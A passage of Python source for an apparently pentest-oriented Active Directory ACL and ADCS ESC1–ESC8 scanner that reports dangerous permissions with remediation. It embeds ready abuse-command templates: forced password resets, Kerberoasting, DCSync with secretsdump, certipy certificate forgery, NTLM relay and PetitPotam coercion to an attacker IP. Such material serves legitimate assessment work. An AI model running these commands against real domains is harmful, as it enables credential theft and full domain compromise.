"""ACL scanner — enumerate dangerous ACEs on high-value AD objects + ADCS ESC chains.

Checks nTSecurityDescriptor on:
  - The domain root object (GenericAll → domain takeover)
  - Domain Controllers OU and DC machine accounts
  - AdminSDHolder (all protected accounts inherit this)
  - Privileged group objects:
      Domain Admins, Enterprise Admins, Schema Admins,
      Protected Users, Backup Operators, Account Operators,
      Read-only Domain Controllers
  - krbtgt account
  - ADCS certificate templates (ESC1–ESC4)
  - Certification Authority objects (ESC7)

Dangerous rights checked:
  GenericAll, GenericWrite, WriteDACL, WriteOwner, AllExtendedRights,
  WriteProperty (ForceChangePassword GUID, SelfMembership GUID),
  WriteKeyCredentialLink (shadow credentials — T1556),
  WriteSPN (targeted Kerberoasting — T1558.003)

ADCS ESC Chains (MITRE T1649):
  ESC1: ENROLLEE_SUPPLIES_SUBJECT + no manager approval → arbitrary SAN
  ESC2: Any Purpose EKU → certificate usable for any purpose
  ESC3: Certificate Request Agent EKU → enroll on behalf of another principal
  ESC4: WriteDACL/WriteOwner/GenericAll on template → modify template flags
  ESC7: ManageCertificates right on CA → issue failed/pending certificate requests
  ESC8: Web enrollment enabled → NTLM relay to ADCS HTTP endpoint

MITRE ATT&CK mapping:
  T1484.001 — Domain Policy Modification (DACL/SACL abuse)
  T1649     — Steal or Forge Authentication Certificates (ADCS ESC)
  T1558.003 — Kerberoasting via WriteSPN
  T1556     — Modify Authentication Process (WriteKeyCredentialLink / shadow creds)
"""
from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

# ---------------------------------------------------------------------------
# CVSS vectors
# ---------------------------------------------------------------------------
CVSS_ACL          = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
CVSS40_ACL        = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
CVSS_ACL_HIGH     = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
CVSS40_ACL_HIGH   = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
# ADCS ESC chains — network access, low complexity, domain compromise
CVSS_ADCS_ESC     = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
CVSS40_ADCS_ESC   = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
# WriteSPN / WriteKeyCredentialLink
CVSS_WRITESPN     = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
CVSS40_WRITESPN   = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
CVSS_SHADOWCRED   = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N"
CVSS40_SHADOWCRED = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"

# ---------------------------------------------------------------------------
# Active Directory well-known extended right GUIDs
# ---------------------------------------------------------------------------
GUID_REPLICATION_GET_CHANGES     = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
GUID_REPLICATION_GET_CHANGES_ALL = "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2"
GUID_FORCE_CHANGE_PASSWORD       = "00299570-246d-11d0-a768-00aa006e0529"
GUID_SELF_MEMBERSHIP             = "bf9679c0-0de6-11d0-a285-00aa003049e2"
GUID_WRITE_MEMBERS               = "bf9679c0-0de6-11d0-a285-00aa003049e2"
# WriteKeyCredentialLink — msDS-KeyCredentialLink attribute schema GUID
GUID_KEY_CREDENTIAL_LINK         = "5b47d60f-6090-40b2-9f37-2a4de88f3063"
# WriteSPN — servicePrincipalName attribute schema GUID
GUID_SERVICE_PRINCIPAL_NAME      = "f3a64788-5306-11d1-a9c5-0000f80367c1"

# ---------------------------------------------------------------------------
# ADCS template flags and EKU OIDs
# ---------------------------------------------------------------------------
# msPKI-Certificate-Name-Flag bit values
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x00000001  # ESC1: enrollee controls SAN field
CT_FLAG_SUBJECT_ALT_REQUIRE_UPN   = 0x02000000
CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL = 0x00400000
# msPKI-Enrollment-Flag bit values
CT_FLAG_PEND_ALL_REQUESTS         = 0x00000002  # manager approval required

# EKU OIDs — dangerous when combined with ESC1/ESC2/ESC3 conditions
EKU_ANY_PURPOSE        = "2.5.29.37.0"                 # ESC2: any purpose certificate
EKU_CERT_REQUEST_AGENT = "1.3.6.1.4.1.311.20.2.1"      # ESC3: certificate request agent
EKU_CLIENT_AUTH        = "1.3.6.1.5.5.7.3.2"            # enables PKINIT / smart card logon
EKU_SMART_CARD_LOGON   = "1.3.6.1.4.1.311.20.2.2"
EKU_PKINIT_CLIENT      = "1.3.6.1.5.2.3.4"

# EKUs that allow domain authentication (relevant for ESC1/2)
DANGEROUS_EKUS = frozenset({
    EKU_CLIENT_AUTH,
    EKU_SMART_CARD_LOGON,
    EKU_PKINIT_CLIENT,
    EKU_ANY_PURPOSE,
    EKU_CERT_REQUEST_AGENT,
})

# ---------------------------------------------------------------------------
# Well-known SIDs to skip (legitimate admin SIDs)
# ---------------------------------------------------------------------------
SKIP_SIDS = frozenset({
    "S-1-5-18",          # SYSTEM
    "S-1-5-32-544",      # Administrators (builtin)
    "S-1-3-0",           # Creator Owner
    "S-1-5-9",           # Enterprise Domain Controllers
    "S-1-5-10",          # Principal Self
    # Domain Admins SIDs vary by domain (S-1-5-21-...-512) — checked dynamically
})

# ---------------------------------------------------------------------------
# Privileged groups — expanded set for thorough coverage
# ---------------------------------------------------------------------------
PRIVILEGED_GROUPS = [
    "Domain Admins",
    "Enterprise Admins",
    "Schema Admins",
    "Protected Users",
    "Backup Operators",
    "Account Operators",
    "Read-only Domain Controllers",
]

# Privileged groups homed in the Builtin container, not Users
BUILTIN_GROUPS = frozenset({"Backup Operators", "Account Operators"})

# ---------------------------------------------------------------------------
# Dangerous rights descriptors
# ---------------------------------------------------------------------------
DANGEROUS_RIGHTS = {
    "GenericAll":             "Full control over object — modify any attribute, reset password",
    "GenericWrite":           "Write to most attributes — can modify delegation, SPNs, group members",
    "WriteDACL":              "Modify discretionary ACL — can grant self GenericAll",
    "WriteOwner":             "Change object owner — new owner can modify ACL (grant self GenericAll)",
    "AllExtendedRights":      "All extended rights including DCSync replication, ForceChangePassword",
    "WriteProperty":          "Write specific property — may allow SPN/delegation modification",
    "Self":                   "Self-modification rights (e.g., add self to group)",
    "WriteKeyCredentialLink": (
        "Write msDS-KeyCredentialLink — shadow credentials attack: attacker adds a "
        "key credential to the target, then authenticates as the target via PKINIT "
        "(T1556 — Modify Authentication Process)"
    ),
    "WriteSPN": (
        "Write servicePrincipalName — attacker sets an SPN on a user account then "
        "requests a Kerberos TGS ticket and cracks it offline "
        "(T1558.003 — Kerberoasting)"
    ),
}

# ---------------------------------------------------------------------------
# Abuse command templates — PowerView, Rubeus, certipy, bloodyAD
# ---------------------------------------------------------------------------
ABUSE_COMMANDS: dict[str, list[str]] = {
    "GenericAll": [
        "# PowerView — reset target user password",
        "$pass = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force",
        "Set-DomainUserPassword -Identity <TARGET> -AccountPassword $pass",
        "# bloodyAD (Linux)",
        "bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p <PASS> set password <TARGET> 'P@ssw0rd123!'",
    ],
    "GenericWrite": [
        "# PowerView — add SPN then Kerberoast",
        "Set-DomainObject -Identity <TARGET> -Set @{serviceprincipalname='fake/spn.<DOMAIN>'}",
        "Invoke-Kerberoast -Identity <TARGET> -OutputFormat Hashcat | Out-File krb.hash",
        "# hashcat: hashcat -m 13100 krb.hash wordlist.txt",
    ],
    "WriteDACL": [
        "# PowerView — grant self GenericAll via DACL write",
        "Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <ATTACKER> -Rights All",
        "Set-DomainUserPassword -Identity <TARGET> -AccountPassword $pass",
        "# bloodyAD",
        "bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p <PASS> add genericAll <TARGET>",
    ],
    "WriteOwner": [
        "# PowerView — take ownership then grant rights",
        "Set-DomainObjectOwner -Identity <TARGET> -OwnerIdentity <ATTACKER>",
        "Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <ATTACKER> -Rights All",
    ],
    "AllExtendedRights": [
        "# DCSync if on domain root",
        "secretsdump.py '<DOMAIN>/<ATTACKER>:<PASS>'@<DC_IP>",
        "# ForceChangePassword if on user object",
        "Set-DomainUserPassword -Identity <TARGET> -AccountPassword $pass",
        "net rpc password <TARGET> 'P@ssw0rd123!' -U <DOMAIN>/<ATTACKER>%<PASS> -S <DC_IP>",
    ],
    "WriteKeyCredentialLink": [
        "# certipy — shadow credentials (Linux)",
        "certipy shadow auto -u <ATTACKER>@<DOMAIN> -p '<PASS>' -account <TARGET> -dc-ip <DC_IP>",
        "# Pywhisker (Linux alternative)",
        "pywhisker.py -d <DOMAIN> -u <ATTACKER> -p '<PASS>' --target <TARGET> --action add",
        "# Rubeus (Windows)",
        "Rubeus.exe shadow /target:<TARGET> /domain:<DOMAIN> /dc:<DC_IP>",
        "# Authenticate with obtained certificate",
        "certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>",
    ],
    "WriteSPN": [
        "# PowerView — add SPN then Kerberoast",
        "Set-DomainObject -Identity <TARGET> -Set @{serviceprincipalname='fake/spn.<DOMAIN>'}",
        "Invoke-Kerberoast -Identity <TARGET> -OutputFormat Hashcat | Out-File krb.hash",
        "hashcat -m 13100 krb.hash /usr/share/wordlists/rockyou.txt",
        "# bloodyAD (Linux)",
        "bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASS>' "
        "set object <TARGET> servicePrincipalName -v 'fake/spn'",
        "impacket-GetUserSPNs '<DOMAIN>/<ATTACKER>:<PASS>' -dc-ip <DC_IP> -request",
    ],
}

# Abuse commands specific to each ADCS ESC chain
ESC_ABUSE_COMMANDS: dict[str, list[str]] = {
    "ESC1": [
        "# certipy — request cert with arbitrary SAN (administrator UPN)",
        "certipy req -u '<ATTACKER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \\",
        "    -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>'",
        "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
        "# Windows — Rubeus + Certify",
        "Certify.exe request /ca:'<CA_NAME>' /template:'<TEMPLATE>' /altname:administrator",
        "Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /ptt",
    ],
    "ESC2": [
        "# certipy — enroll Any Purpose cert and use for authentication",
        "certipy req -u '<ATTACKER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \\",
        "    -ca '<CA_NAME>' -template '<TEMPLATE>'",
        "certipy auth -pfx <ATTACKER>.pfx -dc-ip <DC_IP>",
    ],
    "ESC3": [
        "# Step 1: Request Certificate Request Agent certificate",
        "certipy req -u '<ATTACKER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \\",
        "    -ca '<CA_NAME>' -template '<TEMPLATE>'",
        "# Step 2: Enroll on behalf of administrator using agent cert",
        "certipy req -u '<ATTACKER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \\",
        "    -ca '<CA_NAME>' -template 'User' "
        "-on-behalf-of '<DOMAIN>\\\\administrator' -pfx agent.pfx",
        "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
    ],
    "ESC4": [
        "# certipy — backup template, modify to ESC1 state, request, restore",
        "certipy template -u '<ATTACKER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> "
        "-template '<TEMPLATE>' -save-old",
        "certipy template -u '<ATTACKER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> "
        "-template '<TEMPLATE>'",
        "certipy req -u '<ATTACKER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \\",
        "    -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>'",
        "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
        "# Restore template afterward",
        "certipy template -u '<ATTACKER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> "
        "-template '<TEMPLATE>' -configuration '<TEMPLATE>.json'",
    ],
    "ESC7": [
        "# certipy — issue a pending/denied SubCA request as manager",
        "# Step 1: Enable ManageCA right (may already have it)",
        "certipy ca -u '<ATTACKER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \\",
        "    -ca '<CA_NAME>' -add-officer '<ATTACKER>'",
        "# Step 2: Request SubCA cert (will be denied, note request ID)",
        "certipy req -u '<ATTACKER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \\",
        "    -ca '<CA_NAME>' -template 'SubCA' -upn 'administrator@<DOMAIN>'",
        "# Step 3: Issue the denied request using ManageCertificates",
        "certipy ca -u '<ATTACKER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \\",
        "    -ca '<CA_NAME>' -issue-request <REQUEST_ID>",
        "certipy req -u '<ATTACKER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \\",
        "    -ca '<CA_NAME>' -retrieve <REQUEST_ID>",
        "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
    ],
    "ESC8": [
        "# NTLM relay to ADCS web enrollment — requires coerced DC auth",
        "# Step 1: Start relay targeting ADCS",
        "ntlmrelayx.py -t 'http://<CA_HOST>/certsrv/certfnsh.asp' \\",
        "    --adcs --template 'DomainController'",
        "# Step 2: Coerce DC machine account authentication (choose one)",
        "# PetitPotam (unauthenticated pre-patch):",
        "PetitPotam.py -u '' -p '' <ATTACKER_IP> <DC_IP>",
        "# PrinterBug (MS-RPRN):",
        "printerbug.py '<DOMAIN>/<ATTACKER>:<PASS>'@<DC_IP> <ATTACKER_IP>",
        "# Step 3: Use obtained DC certificate for DCSync",
        "certipy auth -pfx dc.pfx -dc-ip <DC_IP>",
        "secretsdump.py -k -no-pass '<DOMAIN>/dc$@<DC_IP>'",
    ],
}


class AclScanner(BaseModule):
    """AD ACL abuse path scanner — dangerous ACEs on high-value objects + ADCS ESC chains."""

    NAME        = "acl_scanner"
    DESCRIPTION = (
        "Find dangerous ACEs on AD objects (domain root, DCs, AdminSDHolder, privileged groups) "
        "and detect ADCS ESC1–ESC8 certificate template misconfigurations. "
        "Detects WriteKeyCredentialLink (shadow credentials) and WriteSPN (Kerberoasting)."
    )
    PHASE       = 9
    TAGS        = [
        "acl-abuse", "dacl", "privilege-escalation",
        "adcs-esc", "shadow-credentials", "kerberoasting",
        "mitre-T1484.001", "mitre-T1649", "mitre-T1558.003", "mitre-T1556",
    ]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        domain = self.config.extra.get("domain", "")
        dc_ip  = self.config.extra.get("dc", self.config.target)

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        client = LdapClient(
            dc_ip=dc_ip, domain=domain,
            username=self.config.extra.get("username", ""),
            password=self.config.extra.get("password", ""),
            nt_hash=self.config.extra.get("hash", ""),
        )

        if not client.connect():
            return self._make_result(start)

        try:
            dc_parts = ",".join(f"DC={p}" for p in domain.split("."))
            cfg_parts = f"CN=Configuration,{dc_parts}"

            # ------------------------------------------------------------------
            # Domain root and critical singleton objects
            # ------------------------------------------------------------------
            await self.rate_limit()
            await self._check_object_acl(
                client, dc_ip, dc_parts,
                "(objectClass=domain)", "Domain Root Object",
                Severity.CRITICAL,
            )

            await self.rate_limit()
            await self._check_object_acl(
                client, dc_ip, f"CN=AdminSDHolder,CN=System,{dc_parts}",
                "(objectClass=*)", "AdminSDHolder",
                Severity.CRITICAL,
                search_scope="BASE",
            )

            await self.rate_limit()
            await self._check_object_acl(
                client, dc_ip, f"CN=krbtgt,CN=Users,{dc_parts}",
                "(sAMAccountName=krbtgt)", "krbtgt Account",
                Severity.CRITICAL,
                search_scope="BASE",
            )

            # ------------------------------------------------------------------
            # Privileged groups — expanded set
            # ------------------------------------------------------------------
            for group in PRIVILEGED_GROUPS:
                await self.rate_limit()
                container = "CN=Builtin" if group in BUILTIN_GROUPS else "CN=Users"
                await self._check_object_acl(
                    client, dc_ip,
                    f"CN={group},{container},{dc_parts}",
                    f"(cn={group})", f"Privileged Group: {group}",
                    Severity.HIGH,
                    search_scope="BASE",
                )

            # ------------------------------------------------------------------
            # Domain Controllers OU
            # ------------------------------------------------------------------
            await self.rate_limit()
            await self._check_object_acl(
                client, dc_ip, f"OU=Domain Controllers,{dc_parts}",
                "(objectClass=organizationalUnit)", "Domain Controllers OU",
                Severity.HIGH,
                search_scope="BASE",
            )

            # ------------------------------------------------------------------
            # ADCS ESC chain detection
            # ------------------------------------------------------------------
            await self.rate_limit()
            await self._check_adcs_templates(client, dc_ip, cfg_parts)

            await self.rate_limit()
            await self._check_ca_permissions(client, dc_ip, cfg_parts)

        finally:
            client.disconnect()

        return self._make_result(start)

    # --------------------------------------------------------------------------
    # ACL check helpers
    # --------------------------------------------------------------------------

    async def _check_object_acl(
        self,
        client: LdapClient,
        dc_ip: str,
        base_dn: str,
        search_filter: str,
        object_label: str,
        finding_severity: Severity,
        search_scope: str = "BASE",
    ) -> None:
        """Retrieve nTSecurityDescriptor for an object and report dangerous ACEs."""
        try:
            from ldap3 import SECURITY_DESCRIPTOR_CONTROL  # noqa: F401
        except ImportError:
            return

        entries = client.search(
            search_filter,
            ["distinguishedName", "nTSecurityDescriptor", "sAMAccountName", "cn"],
            base_dn=base_dn,
            search_scope=search_scope,
            controls=[("1.2.840.113556.1.4.801", True, b"\x30\x03\x02\x01\x07")],
        )

        for entry in entries:
            dn = entry.get("dn", base_dn)
            sd = entry.get("nTSecurityDescriptor", "")
            if not sd:
                continue

            issues = self._analyze_security_descriptor(sd, dn)
            if not issues:
                continue

            for issue in issues:
                right      = issue["right"]
                trustee    = issue["trustee"]
                desc       = DANGEROUS_RIGHTS.get(right, "Elevated access")
                abuse_cmds = ABUSE_COMMANDS.get(right, [])
                is_shadow  = right == "WriteKeyCredentialLink"
                is_spn     = right == "WriteSPN"

                cvss31  = CVSS_SHADOWCRED if is_shadow else (
                    CVSS_WRITESPN if is_spn else (
                        CVSS_ACL_HIGH if finding_severity == Severity.CRITICAL else CVSS_ACL
                    )
                )
                cvss40  = CVSS40_SHADOWCRED if is_shadow else (
                    CVSS40_WRITESPN if is_spn else CVSS40_ACL_HIGH
                )

                mitre = ["TA0004/T1484.001"]
                if is_shadow:
                    mitre.append("TA0006/T1556")
                if is_spn:
                    mitre.append("TA0006/T1558.003")

                repro = [
                    "# BloodHound: automatic detection of all ACL paths",
                    f"Get-ObjectAcl -Identity '{object_label}' -ResolveGUIDs | "
                    f"Where {{$_.ActiveDirectoryRights -match '{right}'}}",
                ]
                repro.extend(abuse_cmds)

                ev = Evidence(extra={
                    "object_label": object_label,
                    "object_dn":    dn,
                    "trustee_sid":  trustee,
                    "right":        right,
                    "description":  desc,
                })

                self.new_finding(
                    title=(
                        f"Dangerous ACE on {object_label} — {right} granted to {trustee}"
                    ),
                    severity=finding_severity,
                    description=(
                        f"Dangerous ACE detected on {object_label} ({dn}):\n\n"
                        f"  Trustee SID: {trustee}\n"
                        f"  Right:       {right}\n"
                        f"  Impact:      {desc}\n\n"
                        "Non-default principal has elevated rights on a high-value AD object. "
                        "Possible attack paths:\n"
                        "  • GenericAll/GenericWrite → modify any attribute, Kerberoast targets\n"
                        "  • WriteDACL/WriteOwner → grant self GenericAll → full object control\n"
                        "  • AllExtendedRights on domain root → DCSync replication rights\n"
                        "  • WriteKeyCredentialLink → shadow credentials / PKINIT authentication\n"
                        "  • WriteSPN → set SPN then Kerberoast offline"
                    ),
                    reproduction_steps=repro,
                    remediation=(
                        f"Remove the unexpected ACE for SID {trustee} from {object_label}. "
                        "Use BloodHound to identify all ACL-based attack paths. "
                        "Regularly audit ACLs on high-value objects with PowerView or ADACLScanner. "
                        "Enable Protected Users security group for privileged accounts."
                    ),
                    references=[
                        "MITRE TA0004/T1484.001",
                        "https://attack.mitre.org/techniques/T1484/001/",
                        "https://github.com/BloodHoundAD/BloodHound",
                        "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces",
                    ],
                    evidence=ev,
                    cvss_v31_vector=cvss31,
                    cvss_v40_vector=cvss40,
                    mitre_attack=mitre,
                    target=dc_ip,
                )

    def _analyze_security_descriptor(self, raw_sd: object, dn: str) -> list[dict]:
        """Parse binary nTSecurityDescriptor and return list of dangerous ACE issues."""
        issues: list[dict] = []
        try:
            from impacket.ldap import ldaptypes
        except ImportError:
            return issues

        try:
            sd_bytes: bytes | None = None
            if isinstance(raw_sd, (bytes, bytearray)):
                sd_bytes = bytes(raw_sd)
            elif hasattr(raw_sd, "raw_values") and raw_sd.raw_values:
                sd_bytes = raw_sd.raw_values[0]
            elif hasattr(raw_sd, "value") and raw_sd.value:
                sd_bytes = raw_sd.value

            if not sd_bytes:
                return issues

            sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
            sd.fromString(sd_bytes)

            if not sd.get("Dacl"):
                return issues

            _SKIP_SIDS_INNER = {
                "S-1-5-18",      # SYSTEM
                "S-1-5-32-544",  # Administrators
                "S-1-5-32-512",  # Domain Admins (well-known)
            }

            # Access mask → right name for standard rights
            RIGHT_MAP = {
                0xF01FF: "GenericAll",
                0x40000: "WriteDACL",
                0x80000: "WriteOwner",
                0x20000: "WriteProperty",
            }

            for ace in sd["Dacl"]["Data"]:
                type_name = ace["TypeName"]
                if type_name not in ("ACCESS_ALLOWED_ACE", "ACCESS_ALLOWED_OBJECT_ACE"):
                    continue

                mask    = ace["Ace"]["Mask"]["Mask"]
                sid_str = ace["Ace"]["Sid"].formatCanonical()

                if sid_str in _SKIP_SIDS_INNER:
                    continue

                # Extract object type GUID for OBJECT ACEs
                obj_type_guid: str | None = None
                if type_name == "ACCESS_ALLOWED_OBJECT_ACE":
                    flags = ace["Ace"].get("Flags", 0)
                    if flags & 0x1 and hasattr(ace["Ace"], "ObjectType"):
                        try:
                            ot = ace["Ace"]["ObjectType"]
                            obj_type_guid = _guid_bytes_to_str(ot)
                        except Exception:
                            pass

                # Standard broad rights
                for mask_val, right_name in RIGHT_MAP.items():
                    if mask & mask_val == mask_val:
                        issues.append({"trustee": sid_str, "right": right_name})
                        break

                # AllExtendedRights (0x100)
                if mask & 0x100:
                    issues.append({"trustee": sid_str, "right": "AllExtendedRights"})

                # WriteProperty on specific attribute GUIDs
                if (mask & 0x20) and obj_type_guid:
                    if obj_type_guid.lower() == GUID_KEY_CREDENTIAL_LINK:
                        issues.append({"trustee": sid_str, "right": "WriteKeyCredentialLink"})
                    elif obj_type_guid.lower() == GUID_SERVICE_PRINCIPAL_NAME:
                        issues.append({"trustee": sid_str, "right": "WriteSPN"})

        except Exception as exc:
            self.log.debug("SD parse error on %s: %s", dn, exc)

        return issues

    # --------------------------------------------------------------------------
    # ADCS ESC detection
    # --------------------------------------------------------------------------

    async def _check_adcs_templates(
        self,
        client: LdapClient,
        dc_ip: str,
        cfg_parts: str,
    ) -> None:
        """Check ADCS certificate templates for ESC1–ESC4 misconfigurations."""
        templates_base = (
            f"CN=Certificate Templates,CN=Public Key Services,"
            f"CN=Services,{cfg_parts}"
        )
        attrs = [
            "cn",
            "displayName",
            "distinguishedName",
            "msPKI-Certificate-Name-Flag",
            "msPKI-Enrollment-Flag",
            "pKIExtendedKeyUsage",
            "nTSecurityDescriptor",
        ]

        entries = client.search(
            "(objectClass=pKICertificateTemplate)",
            attrs,
            base_dn=templates_base,
            search_scope="SUBTREE",
        )

        for entry in entries:
            dn           = entry.get("dn", "")
            name         = entry.get("cn") or entry.get("displayName", dn)
            name_flag    = int(entry.get("msPKI-Certificate-Name-Flag", 0) or 0)
            enroll_flag  = int(entry.get("msPKI-Enrollment-Flag", 0) or 0)
            ekus         = entry.get("pKIExtendedKeyUsage") or []
            if isinstance(ekus, str):
                ekus = [ekus]

            enrollee_supplies_subject = bool(name_flag & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
            manager_approval          = bool(enroll_flag & CT_FLAG_PEND_ALL_REQUESTS)
            has_dangerous_eku         = any(e in DANGEROUS_EKUS for e in ekus)

            # ESC1: Enrollee supplies subject + no manager approval + dangerous EKU
            if enrollee_supplies_subject and not manager_approval and has_dangerous_eku:
                self._report_esc(
                    dc_ip, "ESC1", name, dn,
                    severity=Severity.CRITICAL,
                    detail=(
                        f"Template '{name}' has ENROLLEE_SUPPLIES_SUBJECT set "
                        f"(msPKI-Certificate-Name-Flag=0x{name_flag:08x}), "
                        "manager approval is NOT required, and a dangerous EKU is present. "
                        "Any enrolled user can specify an arbitrary Subject Alternative Name "
                        "(e.g., administrator@domain) and obtain a certificate for any account."
                    ),
                )

            # ESC2: Any Purpose EKU present
            if EKU_ANY_PURPOSE in ekus:
                self._report_esc(
                    dc_ip, "ESC2", name, dn,
                    severity=Severity.HIGH,
                    detail=(
                        f"Template '{name}' contains the Any Purpose EKU (OID {EKU_ANY_PURPOSE}). "
                        "Certificates issued from this template can be used for any purpose including "
                        "client authentication, allowing PKINIT-based domain authentication."
                    ),
                )

            # ESC3: Certificate Request Agent EKU present
            if EKU_CERT_REQUEST_AGENT in ekus and not manager_approval:
                self._report_esc(
                    dc_ip, "ESC3", name, dn,
                    severity=Severity.HIGH,
                    detail=(
                        f"Template '{name}' contains the Certificate Request Agent EKU "
                        f"(OID {EKU_CERT_REQUEST_AGENT}) without manager approval. "
                        "An attacker can enroll a Certificate Request Agent certificate "
                        "and then request certificates on behalf of any principal, including "
                        "Domain Admins."
                    ),
                )

            # ESC4: Dangerous ACE on template object itself
            raw_sd = entry.get("nTSecurityDescriptor", "")
            if raw_sd:
                template_acl_issues = self._analyze_security_descriptor(raw_sd, dn)
                dangerous_template_rights = {
                    "GenericAll", "GenericWrite", "WriteDACL", "WriteOwner"
                }
                for issue in template_acl_issues:
                    if issue["right"] in dangerous_template_rights:
                        self._report_esc(
                            dc_ip, "ESC4", name, dn,
                            severity=Severity.HIGH,
                            detail=(
                                f"Principal SID {issue['trustee']} has {issue['right']} "
                                f"on the certificate template object '{name}' ({dn}). "
                                "This allows modifying the template's dangerous attributes "
                                "(e.g., enabling ENROLLEE_SUPPLIES_SUBJECT) to create an ESC1 "
                                "condition and then requesting a certificate for any account."
                            ),
                            extra_trustee=issue["trustee"],
                            extra_right=issue["right"],
                        )

    async def _check_ca_permissions(
        self,
        client: LdapClient,
        dc_ip: str,
        cfg_parts: str,
    ) -> None:
        """Check CA enrollment service objects for ESC7 (ManageCertificates abuse)."""
        ca_base = (
            f"CN=Enrollment Services,CN=Public Key Services,"
            f"CN=Services,{cfg_parts}"
        )
        attrs = [
            "cn",
            "distinguishedName",
            "dNSHostName",
            "nTSecurityDescriptor",
        ]

        entries = client.search(
            "(objectClass=pKIEnrollmentService)",
            attrs,
            base_dn=ca_base,
            search_scope="SUBTREE",
        )

        for entry in entries:
            dn       = entry.get("dn", "")
            ca_name  = entry.get("cn", dn)
            ca_host  = entry.get("dNSHostName", dc_ip)
            raw_sd   = entry.get("nTSecurityDescriptor", "")

            if raw_sd:
                ca_issues = self._analyze_security_descriptor(raw_sd, dn)
                dangerous_ca_rights = {"GenericAll", "WriteDACL", "WriteOwner", "AllExtendedRights"}
                for issue in ca_issues:
                    if issue["right"] in dangerous_ca_rights:
                        self._report_esc(
                            dc_ip, "ESC7", ca_name, dn,
                            severity=Severity.HIGH,
                            detail=(
                                f"Principal SID {issue['trustee']} has {issue['right']} "
                                f"on Certification Authority '{ca_name}'. "
                                "ManageCertificates-equivalent rights allow the attacker to "
                                "issue previously denied or pending certificate requests, "
                                "including SubCA certificates that grant domain admin access."
                            ),
                            extra_trustee=issue["trustee"],
                            extra_right=issue["right"],
                        )

            # ESC8: Check if web enrollment endpoint is accessible
            await self._check_web_enrollment(dc_ip, ca_host, ca_name, dn)

    async def _check_web_enrollment(
        self,
        dc_ip: str,
        ca_host: str,
        ca_name: str,
        ca_dn: str,
    ) -> None:
        """Probe ADCS web enrollment endpoint for ESC8 (HTTP NTLM relay risk)."""
        import socket

        for port in (80, 443):
            try:
                sock = socket.create_connection((ca_host, port), timeout=3)
                sock.close()
                # Port is open — web enrollment may be active
                proto = "https" if port == 443 else "http"
                self._report_esc(
                    dc_ip, "ESC8", ca_name, ca_dn,
                    severity=Severity.CRITICAL,
                    detail=(
                        f"ADCS Web Enrollment endpoint appears reachable at "
                        f"{proto}://{ca_host}/certsrv/ (port {port} open). "
                        "If NTLM authentication is enabled (default), an attacker can relay "
                        "a Domain Controller machine account's NTLM authentication to this "
                        "endpoint to obtain a certificate for the DC, then perform DCSync. "
                        "Coercion methods: PetitPotam, PrinterBug (MS-RPRN), DFSCoerce."
                    ),
                )
                break
            except OSError:
                pass

    def _report_esc(
        self,
        dc_ip: str,
        esc_id: str,
        template_or_ca: str,
        dn: str,
        severity: Severity,
        detail: str,
        extra_trustee: str = "",
        extra_right: str = "",
    ) -> None:
        """Emit a finding for an ADCS ESC chain vulnerability."""
        abuse = ESC_ABUSE_COMMANDS.get(esc_id, [])
        references = [
            f"MITRE T1649 — Steal or Forge Authentication Certificates",
